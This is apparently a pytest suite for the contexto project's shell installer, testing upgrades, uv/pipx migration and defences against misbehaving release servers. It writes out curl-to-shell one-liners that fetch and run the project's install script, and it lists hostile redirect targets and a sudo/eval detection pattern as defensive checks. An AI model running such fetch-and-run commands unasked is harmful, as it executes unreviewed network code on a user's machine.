                 "CONTEXTO_INSTALL_BASE_URL", "CONTEXTO_HOME", "uv", "pipx", "SHA256SUMS", "3.12",
                 "uv may download a Python"):
        assert word in result.stdout, word
    assert box.calls() == [] and box.hub.requests == []
    assert ok(box.run("-h")).stdout == result.stdout


@pytest.mark.parametrize("arguments", [("--bogus",), ("extra",), ("--version",), ("--with",), ("--end-of-script",),
                                       ("--", "--dry-run")])
def test_an_unknown_or_incomplete_option_is_a_usage_error(box, arguments):
    box.hub.add("1.2.3")
    result = failed(box.run(*arguments))
    assert result.returncode == 2
    assert "--help" in result.stderr
    box.assert_untouched()
    assert box.hub.requests == []


# --- Upgrade and migration ---


@pytest.mark.parametrize("tool", ["uv", "pipx"])
def test_already_up_to_date_does_nothing(make_box, tool):
    box = make_box(tools=(tool,))
    box.preinstall(tool, "contexto", "1.2.3")
    box.hub.add("1.2.3")
    result = ok(box.run())
    assert "contexto 1.2.3 is already installed" in result.stdout
    assert "--force" in result.stdout
    box.assert_untouched()
    assert box.hub.downloads(".whl") == [] and box.hub.downloads("SHA256SUMS") == []


@pytest.mark.parametrize("tool", ["uv", "pipx"])
def test_force_reinstalls_the_same_release(make_box, tool):
    box = make_box(tools=(tool,))
    box.preinstall(tool, "contexto", "1.2.3")
    box.hub.add("1.2.3")
    ok(box.run("--force"))
    changes = box.changes()
    assert len(changes) == 1 and "install" in changes[0] and "--force" in changes[0]
    assert box.installed() == {f"{tool}:contexto": "1.2.3"}


@pytest.mark.parametrize("tool", ["uv", "pipx"])
@pytest.mark.parametrize("dist", ["contexto", "contexto-proxy"])
def test_running_again_upgrades_in_place_under_one_name(make_box, tool, dist):
    box = make_box(tools=(tool,))
    box.preinstall(tool, dist, "1.2.2")
    box.hub.add("1.2.3", dist)
    result = ok(box.run())
    assert box.installed() == {f"{tool}:{dist}": "1.2.3"}
    assert box.command_version() == "contexto 1.2.3"
    assert not [change for change in box.changes() if "uninstall" in change]
    assert result.stdout.rstrip().splitlines()[-1] == "contexto 1.2.3"


@pytest.mark.parametrize("tool,shell", [("uv", shell) for shell in SHELLS] + [("pipx", SH)])
def test_migration_from_the_old_distribution_name(make_box, tool, shell):
    box = make_box(tools=(tool,))
    box.preinstall(tool, "contexto", "1.2.2")
    box.hub.add("2.0.0", "contexto-proxy")
    result = ok(box.run(shell=shell))
    changes = box.changes()
    uninstall = "uv tool uninstall contexto" if tool == "uv" else "pipx uninstall contexto"
    assert changes[0] == uninstall
    assert len(changes) == 2 and "install" in changes[1] and "contexto_proxy-2.0.0" in changes[1]
    assert box.installed() == {f"{tool}:contexto-proxy": "2.0.0"}, "the old install is gone, the new one is there"
    assert box.command_version() == "contexto 2.0.0"
    assert uninstall in result.stdout, "the script says what it removed"
    downloaded = box.hub.requests.index("/owner/repo/releases/download/v2.0.0/contexto_proxy-2.0.0-py3-none-any.whl")
    assert downloaded >= 0, "the wheel was downloaded and verified before anything was removed"
    assert (box.home / ".contexto" / "session.json").read_text() == "kept"


@pytest.mark.parametrize("old_tool,new_tool", [("uv", "pipx"), ("pipx", "uv")])
@pytest.mark.parametrize("dist", ["contexto", "contexto-proxy"])
def test_an_install_made_by_the_other_tool_is_replaced_not_shadowed(box, old_tool, new_tool, dist):
    box.preinstall(old_tool, dist, "1.2.2")
    box.hub.add("2.0.0", "contexto-proxy")
    ok(box.run("--with", new_tool))
    assert box.installed() == {f"{new_tool}:contexto-proxy": "2.0.0"}
    assert box.command_version() == "contexto 2.0.0"


def test_going_back_to_a_release_under_the_old_name_also_works(box):
    box.preinstall("uv", "contexto-proxy", "2.0.0")
    box.hub.add("1.2.3", latest=False)
    box.hub.add("2.0.0", "contexto-proxy")
    ok(box.run("--version", "1.2.3"))
    assert box.installed() == {"uv:contexto": "1.2.3"}
    assert box.command_version() == "contexto 1.2.3"


def test_both_names_installed_at_once_is_cleaned_up_even_when_the_version_matches(box):
    # What `uv tool install --force <new wheel>` over an old install leaves: two tools, one command.
    box.preinstall("uv", "contexto", "1.2.2")
    box.preinstall("uv", "contexto-proxy", "2.0.0")
    box.hub.add("2.0.0", "contexto-proxy")
    ok(box.run())
    assert box.installed() == {"uv:contexto-proxy": "2.0.0"}
    assert box.command_version() == "contexto 2.0.0"


def test_a_failed_install_reports_the_installer_output(box):
    box.hub.add("1.2.3")
    failed(box.run(STUB_INSTALL_FAIL="1"), "uv tool install", "error: stub install failure")
    assert list(box.tmpdir.iterdir()) == []


def test_a_command_the_tools_do_not_own_blocks_uv_and_force_overrides_it(make_box):
    box = make_box(tools=("uv",))
    box.command("0.0.1")
    box.hub.add("1.2.3")
    failed(box.run(), "Executable already exists", "--force")
    ok(box.run("--force"))
    assert box.command_version() == "contexto 1.2.3"


def test_a_shadowing_command_is_reported_after_a_pipx_install(make_box):
    box = make_box(tools=("pipx",))
    box.command("0.0.1")
    box.hub.add("1.2.3")
    result = box.run()
    assert result.returncode != 0
    assert "contexto 0.0.1" in result.stderr and "1.2.3" in result.stderr and str(box.bin) in result.stderr


# --- Python for pipx ---


def test_pipx_default_python_is_used_when_it_is_new_enough(make_box):
    box = make_box(tools=("pipx",))
    box.hub.add("1.2.3")
    ok(box.run())
    assert "--python" not in box.changes()[0]


def test_pipx_with_an_old_default_python_gets_a_newer_one_from_path(make_box):
    box = make_box(tools=("pipx",))
    box.stub("python3.11", "python-old")
    newer = box.stub("python3.13", "python-new")
    box.hub.add("1.2.3")
    ok(box.run(STUB_PIPX_PYTHON=str(box.old_python)))
    wheel = f"{box.tmpdir}/{_tmp_name(box)}/contexto-1.2.3-py3-none-any.whl"
    assert box.changes() == [f"pipx install --python {newer} {wheel}"]


def test_pipx_too_old_to_name_its_python_gets_one_from_path(make_box):
    box = make_box(tools=("pipx",))
    newer = box.stub("python3.12", "python-new")
    box.hub.add("1.2.3")
    ok(box.run(STUB_PIPX_NO_ENVIRONMENT="1"))
    assert f"--python {newer}" in box.changes()[0]


def test_pipx_with_no_python_3_12_or_later_stops_before_any_download(make_box):
    box = make_box(tools=("pipx",))
    box.stub("python3", "python-old")
    box.hub.add("1.2.3")
    failed(box.run(STUB_PIPX_PYTHON=str(box.old_python)), "Python 3.12", "Nothing was installed")
    box.assert_untouched()
    assert box.hub.requests == []


# --- Output ---


def test_output_is_short_and_says_session_data_is_kept(box):
    box.hub.add("1.2.3")
    result = ok(box.run())
    assert "~/.contexto" in result.stdout and "not touched" in result.stdout
    assert len(result.stdout.splitlines()) <= 12
    assert result.stderr == ""
    assert ok(box.run("--force", CONTEXTO_HOME="/somewhere/else")).stdout.count("/somewhere/else") == 1
    assert (box.home / ".contexto" / "session.json").read_text() == "kept"


def test_a_path_hint_is_printed_when_the_command_is_not_on_path(box):
    box.hub.add("1.2.3")
    path = os.pathsep.join(map(str, (box.stubs, box.system)))
    result = ok(box.run(PATH=path))
    assert "not on PATH" in result.stdout
    assert f'export PATH="{box.bin}:$PATH"' in result.stdout
    assert "contexto 1.2.3" in result.stdout
    assert "not on PATH" not in ok(box.run("--force")).stdout


def test_already_up_to_date_is_seen_when_the_command_is_not_on_path(box):
    box.preinstall("uv", "contexto", "1.2.3")
    box.hub.add("1.2.3")
    path = os.pathsep.join(map(str, (box.stubs, box.system)))
    result = ok(box.run(PATH=path))
    assert "already installed" in result.stdout
    box.assert_untouched()


# --- The base URL ---


def test_a_base_url_override_is_announced(box):
    box.hub.add("1.2.3")
    assert f"CONTEXTO_INSTALL_BASE_URL={box.hub.url}" in ok(box.run()).stdout


@pytest.mark.parametrize("url", [
    "http://example.invalid/owner/repo",
    "http://127.0.0.1.example.invalid/owner/repo",
    "http://127.0.0.1:80@example.invalid/owner/repo",
    "http://localhost.example.invalid/owner/repo",
    "ftp://127.0.0.1/owner/repo",
    "file:///tmp/owner/repo",
    "127.0.0.1/owner/repo",
    "https://user@example.invalid/owner/repo",
])
def test_plain_http_is_refused_except_for_this_machine(box, url):
    box.hub.add("1.2.3")
    assert failed(box.run(CONTEXTO_INSTALL_BASE_URL=url), "CONTEXTO_INSTALL_BASE_URL").returncode == 2
    box.assert_untouched()
    assert box.hub.requests == []


def test_localhost_by_name_is_accepted(box):
    box.hub.add("1.2.3")
    ok(box.run(CONTEXTO_INSTALL_BASE_URL=box.hub.url.replace("127.0.0.1", "localhost") + "/"))
    assert box.installed() == {"uv:contexto": "1.2.3"}


def test_the_default_base_url_is_github_over_https():
    text = SCRIPT.read_text()
    assert "https://github.com/VentureForgre/contexto" in text
    assert "--proto" in text and "--tlsv1.2" in text
    assert "http://github.com" not in text


# --- A server that misbehaves ---


HOSTILE_REDIRECTS = {
    "another repository": "{origin}/other/repo/releases/tag/v1.2.3",
    "another path on the same base": "{base}/tags/v1.2.3",
    "encoded path traversal": "{base}/releases/tag/v1.2.3%2F..%2Fx",
    "a pre-release tag": "{base}/releases/tag/v1.2.3-rc1",
    "a tag without the v": "{base}/releases/tag/1.2.3",
    "a later path segment": "{base}/releases/tag/v1.2.3/extra",
    "a tag that is not a version": "{base}/releases/tag/vNEXT",
    "a fourth number": "{base}/releases/tag/v1.2.3.4",
    "a query": "{base}/releases/tag/v1.2.3?x=1",
}


@pytest.mark.parametrize("case", sorted(HOSTILE_REDIRECTS))
def test_a_hostile_latest_redirect_is_refused(box, case):
    box.preinstall("uv", "contexto", "1.2.2")
    box.hub.add("1.2.3")
    box.hub.latest_target = HOSTILE_REDIRECTS[case]
    failed(box.run(), "releases/latest", "Nothing was installed")
    box.assert_untouched()
    assert not [path for path in box.hub.requests if "/releases/download/" in path]
    assert box.installed() == {"uv:contexto": "1.2.2"}


def test_a_server_that_stalls_or_drips_ends_the_run_with_a_message(box):
    """Three runs at once: /releases/latest never answers, SHA256SUMS drips, the wheel never comes.

    The copy of the script has its waits cut from 15 and 30 seconds to 1 or 2, by editing the two
    numbers; the script has no option or variable for them."""
    fast = box.edited_script(("connect_timeout=15\n", "connect_timeout=2\n"),
                             ("stall_seconds=30\n", "stall_seconds=1\n"))
    box.hub.add("1.0.1", latest=False)
    box.hub.add("1.0.2", latest=False)
    box.hub.add("1.2.3")
    box.hub.stall = {"/releases/latest", "/blob/v1.0.2/contexto-1.0.2-py3"}
    box.hub.drip = {"/blob/v1.0.1/SHA256SUMS"}
    started = time.monotonic()
    with ThreadPoolExecutor(max_workers=3) as pool:
        results = list(pool.map(lambda arguments: box.run(*arguments, script=fast),
                                [(), ("--version", "1.0.1"), ("--version", "1.0.2")]))
    assert time.monotonic() - started < 20
    for result, what in zip(results, ("releases/latest", "SHA256SUMS", "contexto-1.0.2-py3-none-any.whl")):
        failed(result, "Could not", what, "Nothing was installed", "curl:")
    box.assert_untouched()


def test_an_endless_checksum_file_is_refused(box):
    fast = box.edited_script(("max_seconds=600\n", "max_seconds=10\n"))
    box.hub.add("1.2.3")
    box.hub.endless = {"/blob/v1.2.3/SHA256SUMS"}
    started = time.monotonic()
    failed(box.run(script=fast), "SHA256SUMS", "Nothing was installed")
    assert time.monotonic() - started < 20
    box.assert_untouched()
    assert box.hub.downloads(".whl") == []


def test_an_endless_wheel_is_cut_at_the_size_limit(box):
    """The script as shipped, with its 600 second limit: only the 100 MB size limit can end this
    quickly. The server sends 160 MB and then stalls, so a higher limit would wait for the stall."""
    box.hub.add("1.2.3")
    box.hub.huge = {"/blob/v1.2.3/contexto-1.2.3-py3"}
    started = time.monotonic()
    failed(box.run(), "Could not download", "contexto-1.2.3-py3-none-any.whl", "Nothing was installed")
    assert time.monotonic() - started < 15
    box.assert_untouched()


def test_the_latest_release_is_found_with_head_only(box):
    """The test server refuses GET on /releases/latest, as every other test runs with."""
    box.hub.add("1.2.3")
    ok(box.run("--dry-run"))
    assert box.hub.requests.count("/owner/repo/releases/latest") == 1


def test_a_mirror_that_refuses_head_is_told_that_version_skips_the_lookup(box):
    box.hub.add("1.2.3")
    box.hub.refused_on_latest = {"GET", "HEAD"}
    result = failed(box.run(), "Could not read", "--version X.Y.Z skips this lookup", "Nothing was installed")
    assert "405" in result.stderr
    box.assert_untouched()
    ok(box.run("--version", "1.2.3"))
    assert box.installed() == {"uv:contexto": "1.2.3"}


def test_printed_commands_can_be_pasted(make_box):
    """`>=3.12` unquoted would be a redirection; a temporary directory may hold a space."""
    box = make_box()
    spaced = box.tmpdir / "with space"
    spaced.mkdir()
    box.preinstall("pipx", "contexto", "1.2.2")
    box.hub.add("2.0.0", "contexto-proxy")
    result = ok(box.run("--dry-run", "--with", "uv", TMPDIR=str(spaced)))
    lines = [line.split(": ", 1)[1] for line in result.stdout.splitlines() if line.startswith("Would run: ")]
    assert [shlex.split(line)[:3] for line in lines] == [
        ["uv", "tool", "run"], ["pipx", "uninstall", "contexto"], ["uv", "tool", "install"]]
    for line in lines:
        words = shlex.split(line)
        assert ">" not in line.replace("'>=3.12'", ""), line
        if words[0] == "uv":
            assert words[3:5] == ["--python", ">=3.12"], line
            assert any(word.startswith(f"{spaced}/contexto-install.") for word in words), line
    box.hub.add("2.0.1", "contexto-proxy")
    output = ok(box.run("--with", "uv")).stdout
    installing = [line for line in output.splitlines() if line.startswith("Installing with uv: ")]
    words = shlex.split(installing[0].split(": ", 1)[1])
    assert words[:5] == ["uv", "tool", "install", "--python", ">=3.12"] and words[5].endswith(".whl")


def test_every_download_has_a_time_limit_and_a_size_limit():
    code = SCRIPT.read_text().replace("\\\n", " ")
    calls = [line for line in code.splitlines() if re.match(r"\s*curl --", line)]
    assert len(calls) == 1, "every download goes through one curl call"
    for call in calls:
        for option in ("--connect-timeout", "--speed-limit", "--speed-time", "--max-time", "--max-filesize",
                       "--proto", "--proto-redir", "--tlsv1.2"):
            assert option in call, f"{option} missing from: {call.strip()}"


@pytest.mark.parametrize("shell", SHELLS)
def test_a_signal_before_the_temporary_directory_exists_removes_nothing(box, shell):
    """The exit trap is set before mktemp runs. Until mktemp has answered, it must have no path."""
    canary = box.tmpdir / "someone-elses-file"
    canary.write_text("kept")
    first = box.state / "first"
    first.mkdir()
    (first / "rm").symlink_to(box.stub_files["rm-recorder"])
    path = os.pathsep.join((str(first), box.env["PATH"]))
    box.hub.add("1.2.3")
    line = "    parent=${TMPDIR:-/tmp}\n"
    result = box.run(shell=shell, script=box.edited_script((line, line + "    kill -TERM $$\n")), PATH=path)
    assert result.returncode == 143, result.stderr
    assert not (box.state / "rm.log").exists(), "cleanup ran rm with: " + (box.state / "rm.log").read_text()
    assert canary.read_text() == "kept"
    assert box.changes() == []


def test_cleanup_removes_only_the_directory_this_run_made(box):
    first = box.state / "first"
    first.mkdir()
    (first / "rm").symlink_to(box.stub_files["rm-recorder"])
    path = os.pathsep.join((str(first), box.env["PATH"]))
    box.hub.add("1.2.3")
    line = "    release=$base/releases/download/$tag\n"
    result = box.run(script=box.edited_script((line, "    kill -TERM $$\n" + line)), PATH=path)
    assert result.returncode == 143, result.stderr
    removed = (box.state / "rm.log").read_text().splitlines()
    assert len(removed) == 1 and removed[0].startswith(f"-rf {box.tmpdir}/contexto-install.")
    made = [entry.name for entry in box.tmpdir.iterdir()]
    assert removed[0] == f"-rf {box.tmpdir}/{made[0]}" and len(made) == 1


# --- The wheel is tried before an earlier install is removed ---


@pytest.mark.parametrize("tool", ["uv", "pipx"])
def test_the_wheel_is_run_once_before_the_earlier_install_is_removed(make_box, tool):
    box = make_box(tools=(tool,))
    box.preinstall(tool, "contexto", "1.2.2")
    box.hub.add("2.0.0", "contexto-proxy")
    ok(box.run())
    calls = [call for call in box.calls() if " run " in call or "install" in call]
    trial = "uv tool run --python >=3.12 --from" if tool == "uv" else "pipx run --no-cache --spec"
    assert calls[0].startswith(trial) and calls[0].endswith("/contexto_proxy-2.0.0-py3-none-any.whl contexto --version")
    assert "uninstall contexto" in calls[1] and "install" in calls[2] and len(calls) == 3
    assert box.installed() == {f"{tool}:contexto-proxy": "2.0.0"}


@pytest.mark.parametrize("tool", ["uv", "pipx"])
def test_a_wheel_that_does_not_run_stops_the_upgrade_with_nothing_removed(make_box, tool):
    box = make_box(tools=(tool,))
    box.preinstall(tool, "contexto", "1.2.2")
    box.hub.add("2.0.0", "contexto-proxy")
    failed(box.run(STUB_TRIAL_FAIL="1"), "stub trial failure", "Nothing was installed")
    box.assert_untouched()
    assert box.installed() == {f"{tool}:contexto": "1.2.2"}
    assert box.command_version() == "contexto 1.2.2"


def test_a_first_install_is_not_tried_first(box):
    box.hub.add("1.2.3")
    ok(box.run())
    assert not [call for call in box.calls() if " run " in call]


RAW_SCRIPT = "https://raw.githubusercontent.com/VentureForgre/contexto/main/install.sh"


def as_default_base(box: Box) -> tuple[Path, dict[str, str]]:
    """A copy of the script whose default base is the test server, and no override set: the
    script then behaves as it does for a user who runs it against GitHub."""
    copy = box.edited_script(("default_base=https://github.com/$repo\n", f"default_base={box.hub.url}\n"))
    return copy, {"CONTEXTO_INSTALL_BASE_URL": ""}


@pytest.mark.parametrize("tool", ["uv", "pipx"])
def test_an_install_that_fails_after_the_removal_says_how_to_get_the_old_release_back(make_box, tool):
    """The command works for a piped script and puts the release back with the same tool."""
    box = make_box(tools=(tool,))
    box.preinstall(tool, "contexto", "1.2.2")
    box.hub.add("1.2.2", latest=False)
    box.hub.add("2.0.0", "contexto-proxy")
    script, env = as_default_base(box)
    result = failed(box.run(script=script, STUB_INSTALL_FAIL="1", **env), "stub install failure",
                    "No contexto is installed now")
    hint = f"To get 1.2.2 back: curl -fsSL {RAW_SCRIPT} | sh -s -- --version 1.2.2 --with {tool}"
    assert hint in result.stderr.splitlines()
    assert "Nothing was installed" not in result.stderr
    assert box.installed() == {}
    assert list(box.tmpdir.iterdir()) == []
    # The printed command, with this script in place of the curl, brings the release back.
    words = shlex.split(hint.split(" | ", 1)[1])
    assert words[:3] == ["sh", "-s", "--"]
    ok(box.run(*words[3:], script=script, how="stdin", **env))
    assert box.installed() == {f"{tool}:contexto": "1.2.2"}


def test_the_restore_hint_names_the_tool_whose_install_was_removed(box):
    box.preinstall("pipx", "contexto", "1.2.2")
    box.hub.add("2.0.0", "contexto-proxy")
    script, env = as_default_base(box)
    result = failed(box.run("--with", "uv", script=script, STUB_INSTALL_FAIL="1", **env),
                    "No contexto is installed now")
    assert "pipx uninstall contexto" in result.stdout
    assert "--version 1.2.2 --with pipx" in result.stderr
    assert box.installed() == {}


def test_when_both_tools_had_an_install_the_restore_hint_names_this_runs_tool(box):
    box.preinstall("uv", "contexto", "1.2.2")
    box.preinstall("pipx", "contexto", "1.2.2")
    box.hub.add("2.0.0", "contexto-proxy")
    script, env = as_default_base(box)
    result = failed(box.run("--with", "pipx", script=script, STUB_INSTALL_FAIL="1", **env),
                    "No contexto is installed now")
    assert "uv tool uninstall contexto" in result.stdout
    assert "pipx uninstall contexto" in result.stdout
    assert "--version 1.2.2 --with pipx" in result.stderr
    assert box.installed() == {}


def test_with_a_base_url_override_the_restore_hint_names_it(box):
    box.preinstall("uv", "contexto", "1.2.2")
    box.hub.add("2.0.0", "contexto-proxy")
    result = failed(box.run(STUB_INSTALL_FAIL="1"), "No contexto is installed now")
    assert ("run this script again the same way, with --version 1.2.2 --with uv and "
            f"CONTEXTO_INSTALL_BASE_URL={box.hub.url}.") in " ".join(result.stderr.split())
    assert RAW_SCRIPT not in result.stderr


@pytest.mark.parametrize("tool", ["uv", "pipx"])
def test_the_restore_hint_for_a_release_without_checksums_installs_its_wheel_by_url(make_box, tool):
    """The script refuses a release before v0.5.13, so the hint must not be the script."""
    box = make_box(tools=(tool,))
    box.preinstall(tool, "contexto", "0.5.8")
    box.hub.add("2.0.0", "contexto-proxy")
    script, env = as_default_base(box)
    result = failed(box.run(script=script, STUB_INSTALL_FAIL="1", **env), "No contexto is installed now")
    url = f"{box.hub.url}/releases/download/v0.5.8/contexto-0.5.8-py3-none-any.whl"
    command = f"uv tool install --python '>=3.12' {url}" if tool == "uv" else f"pipx install {url}"
    assert f"To get 0.5.8 back: {command}" in result.stderr.splitlines()
    assert "not checksum-verified" in " ".join(result.stderr.split())
    assert "--version 0.5.8" not in result.stderr


def test_the_pipx_restore_hint_names_a_newer_python_when_uv_was_this_runs_tool(box):
    """pipx's Python is looked at only when pipx installs, so the hint has to look at it itself."""
    newer = box.stub("python3.13", "python-new")
    box.preinstall("pipx", "contexto", "0.5.8")
    box.hub.add("2.0.0", "contexto-proxy")
    script, env = as_default_base(box)
    result = failed(box.run("--with", "uv", script=script, STUB_INSTALL_FAIL="1",
                            STUB_PIPX_PYTHON=str(box.old_python), **env),
                    "No contexto is installed now")
    url = f"{box.hub.url}/releases/download/v0.5.8/contexto-0.5.8-py3-none-any.whl"
    assert f"To get 0.5.8 back: pipx install --python {newer} {url}" in result.stderr.splitlines()


def test_the_pipx_restore_hint_without_a_new_enough_python_still_prints(box):
    """No Python is new enough for pipx: the hint is printed without --python, and the run does not
    stop on that before saying what happened."""
    box.preinstall("pipx", "contexto", "0.5.8")
    box.hub.add("2.0.0", "contexto-proxy")
    script, env = as_default_base(box)
    result = failed(box.run("--with", "uv", script=script, STUB_INSTALL_FAIL="1",
                            STUB_PIPX_PYTHON=str(box.old_python), **env),
                    "No contexto is installed now")
    url = f"{box.hub.url}/releases/download/v0.5.8/contexto-0.5.8-py3-none-any.whl"
    assert f"To get 0.5.8 back: pipx install {url}" in result.stderr.splitlines()
    assert "not checksum-verified" in " ".join(result.stderr.split())


def test_the_force_hint_is_left_out_when_the_command_had_force(make_box):
    """pipx upgrades in place with --force, so telling the user to add it would be no help."""
    box = make_box(tools=("pipx",))
    box.preinstall("pipx", "contexto", "1.2.2")
    box.hub.add("1.2.3")
    result = failed(box.run(STUB_INSTALL_FAIL="1"), "pipx install --force", "stub install failure")
    assert "--force lets" not in result.stderr
    assert box.installed() == {"pipx:contexto": "1.2.2"}, "pipx keeps the earlier install when it fails"


@pytest.mark.parametrize("tool", ["uv", "pipx"])
def test_a_wheel_that_prints_another_version_stops_the_upgrade_and_says_what_it_printed(make_box, tool):
    box = make_box(tools=(tool,))
    box.preinstall(tool, "contexto", "1.2.2")
    box.hub.add("2.0.0", "contexto-proxy")
    result = failed(box.run(STUB_TRIAL_VERSION="2.0.1"), 'should print "contexto 2.0.0"',
                    'It printed "contexto 2.0.1".', "Nothing was installed")
    assert "message is above" not in result.stderr, "the trial command succeeded, so nothing is above"
    box.assert_untouched()
    assert box.installed() == {f"{tool}:contexto": "1.2.2"}


def test_pipx_with_an_old_default_python_tries_the_wheel_with_the_newer_one(make_box):
    """The trial run needs the same --python as the install, or every upgrade stops."""
    box = make_box(tools=("pipx",))
    newer = box.stub("python3.13", "python-new")
    box.preinstall("pipx", "contexto", "1.2.2")
    box.hub.add("1.2.3")
    ok(box.run(STUB_PIPX_PYTHON=str(box.old_python)))
    trial = [call for call in box.calls() if call.startswith("pipx run")]
    assert len(trial) == 1 and trial[0].startswith(f"pipx run --python {newer} ")
    assert box.installed() == {"pipx:contexto": "1.2.3"}


def test_a_pipx_package_that_only_shares_the_name_is_left_alone(box):
    """A package named contexto with some other command is not Contexto, and does not pick pipx."""
    box.preinstall("pipx", "contexto", "9.0.0", command="otherthing")
    box.hub.add("1.2.3")
    result = ok(box.run())
    assert box.changes() == [call for call in box.calls() if call.startswith("uv tool install")]
    assert len(box.changes()) == 1
    assert box.installed() == {"pipx:contexto": "9.0.0", "uv:contexto": "1.2.3"}
    assert (box.state / "pipx-venvs" / "contexto" / "bin" / "otherthing").exists()
    assert "uninstall" not in result.stdout


def test_a_pipx_too_old_to_name_its_environments_goes_by_the_name(box):
    """Without `pipx environment --value PIPX_LOCAL_VENVS` the script cannot look for the command,
    so a pipx package named contexto counts, as docs/install.md says. pipx refuses to install a
    package that has no command, so the unrelated library of that name is not one of these."""
    box.stub("python3.12", "python-new")
    box.preinstall("pipx", "contexto", "9.0.0", command="otherthing")
    box.hub.add("1.2.3")
    ok(box.run(STUB_PIPX_NO_ENVIRONMENT="1"))
    assert box.installed() == {"pipx:contexto": "1.2.3"}
    assert [change.split()[:3] for change in box.changes()] == [["pipx", "install", "--python"]]


def test_replacing_a_newer_release_with_an_older_one_is_said(box):
    box.preinstall("uv", "contexto", "1.2.4")
    box.hub.add("1.2.3")
    result = ok(box.run())
    assert "Replacing contexto 1.2.4 with the older 1.2.3." in result.stdout
    assert box.installed() == {"uv:contexto": "1.2.3"}
    box.hub.add("1.2.5")
    assert "with the older" not in ok(box.run()).stdout


# --- Piped, truncated, and static checks ---


@pytest.mark.parametrize("shell,how", [(shell, "stdin") for shell in SHELLS] + [(SH, "pipe")])
def test_the_script_runs_from_standard_input(box, shell, how):
    box.hub.add("1.2.3")
    result = ok(box.run(shell=shell, how=how))
    assert result.stdout.rstrip().splitlines()[-1] == "contexto 1.2.3"
    assert box.installed() == {"uv:contexto": "1.2.3"}


@pytest.mark.parametrize("how", ["stdin", "pipe"])
def test_options_reach_a_piped_script(box, how):
    box.hub.add("1.2.3")
    result = ok(box.run("--dry-run", "--with", "pipx", how=how))
    assert "Would run: pipx install" in result.stdout
    box.assert_untouched()


FIRST_LINE = b"#!/bin/sh\n"
LAST_LINES = b'\nmain "$@" --end-of-script\n}\n'


def cut_points(text: bytes) -> list[int]:
    """Every byte of the last three lines, and a spread of line starts and other bytes before them.

    Cuts inside the first line are left out: a shell given nothing, or part of the `#!` comment,
    has nothing to run and exits 0, which no script can change."""
    starts = [index + 1 for index, byte in enumerate(text) if byte == 0x0A]
    tail = starts[-4]
    first = len(FIRST_LINE) + 1
    return sorted({*starts[1:-1:12], *range(first, tail, 997), *range(tail, len(text) - 1)})


def test_the_whole_script_is_one_group():
    """So a shell reads to the closing brace before it runs anything."""
    text = SCRIPT.read_bytes()
    assert text.startswith(FIRST_LINE + b"{\n") and text.endswith(LAST_LINES)


@pytest.mark.parametrize("shell", SHELLS)
def test_a_truncated_script_does_nothing_and_fails(box, shell, tmp_path):
    """A download cut short at any byte is a syntax error: no command runs, and the exit is not 0."""
    box.hub.add("1.2.3")
    text = SCRIPT.read_bytes()
    points = cut_points(text)
    if shell != SH:  # the other shells get the last lines and a thinner spread
        tail = len(text) - len(LAST_LINES)
        points = [point for index, point in enumerate(points) if point >= tail or index % 6 == 0]
    part = tmp_path / "part.sh"
    for point in points:
        part.write_bytes(text[:point])
        # --dry-run is the argument a cut must not drop: without it the script would install.
        result = box.run("--dry-run", shell=shell, how="stdin", script=part)
        where = f"cut at byte {point} of {len(text)}: {text[max(0, point - 30):point]!r}"
        assert result.returncode != 0, where
        assert box.calls() == [], where
        assert box.hub.requests == [], where
        assert result.stdout == "", where
    box.assert_untouched()


def test_the_end_marker_is_required(box, tmp_path):
    """`main "$@"` without the marker, or with its arguments gone, refuses to run."""
    box.hub.add("1.2.3")
    failed(box.run(script=box.edited_script(('main "$@" --end-of-script\n', 'main "$@"\n'))), "incomplete")
    failed(box.run("--dry-run", how="stdin", script=box.edited_script(('main "$@" --end-of-script\n', "main\n"))),
           "incomplete")
    box.assert_untouched()
    assert box.hub.requests == []


def test_the_script_never_uses_sudo_eval_or_a_shell_profile():
    lines = [line.split("#", 1)[0] for line in SCRIPT.read_text().splitlines()]
    code = "\n".join(lines)
    assert not re.search(r"(^|[;&|(\s])(sudo|eval|source)\s", code)
    for profile in (".bashrc", ".zshrc", ".profile", ".bash_profile", "/etc/"):
        assert profile not in code, profile
    assert lines[0] == "" and SCRIPT.read_text().startswith("#!/bin/sh\n")
    assert "set -eu" in lines


def test_shellcheck_is_clean():
    shellcheck = shutil.which("shellcheck")
    if not shellcheck:
        pytest.skip("shellcheck is not on PATH")
    result = subprocess.run([shellcheck, "-s", "sh", str(SCRIPT)], capture_output=True, text=True)
    assert result.returncode == 0, result.stdout + result.stderr


@pytest.mark.parametrize("name", ["dash", "bash", "sh"])
def test_syntax_check(name):
    shell = shutil.which(name)
    if not shell:
        pytest.skip(f"{name} is not on PATH")
    result = subprocess.run([shell, "-n", str(SCRIPT)], capture_output=True, text=True)
    assert result.returncode == 0, result.stderr


# --- README.md: the Install section ---


def install_section() -> str:
    text = README.read_text()
    start = text.index("\n## Install\n")
    return text[start:text.index("\n## Quickstart\n", start)]


def test_readme_names_the_release_version_in_exactly_one_line():
    lines = [line for line in README.read_text().splitlines() if "/releases/download/v" in line]
    assert len(lines) == 1, "one line of README.md carries a release download URL"
    line = lines[0]
    section = install_section()
    assert line in section.splitlines(), "and it is in the Install section"
    tag = re.search(r"/releases/download/v(\d+\.\d+\.\d+)/", line)[1]
    assert line.count(tag) == 2, "the version is in the URL twice: the tag and the wheel's name"
    assert section.count(tag) == 2, f"{tag} appears nowhere else in the Install section"


def test_readme_install_section_keeps_its_headings_and_its_links_resolve():
    section = install_section()
    assert "\n### Upgrade\n" in section
    assert "(CHANGELOG.md)" in section
    assert re.findall(r"\]\(([^)\s]+)\)", section), "the section links to the script and the full page"
    assert broken_links(ROOT, ["README.md", "docs/install.md"]) == []


def test_links_into_the_install_page_resolve():
    """The anchors other pages and the script's own messages point at."""
    offered = anchors((ROOT / "docs" / "install.md").read_text())
    wanted = set(re.findall(r"docs/install\.md#([a-z0-9-]+)", SCRIPT.read_text()))
    assert wanted, "the script's messages link into docs/install.md"
    kept = {"other-ways-to-install", "checking-the-download", "from-a-checkout", "uninstall", "platforms"}
    assert wanted | kept | {"upgrade", "troubleshooting"} <= offered


def test_readme_install_section_has_the_one_line_install():
    section = install_section()
    assert "curl -fsSL https://raw.githubusercontent.com/VentureForgre/contexto/main/install.sh | sh" in section
    assert "contexto-proxy" in section and "docs/install.md" in section
    assert (ROOT / "docs" / "install.md").exists()
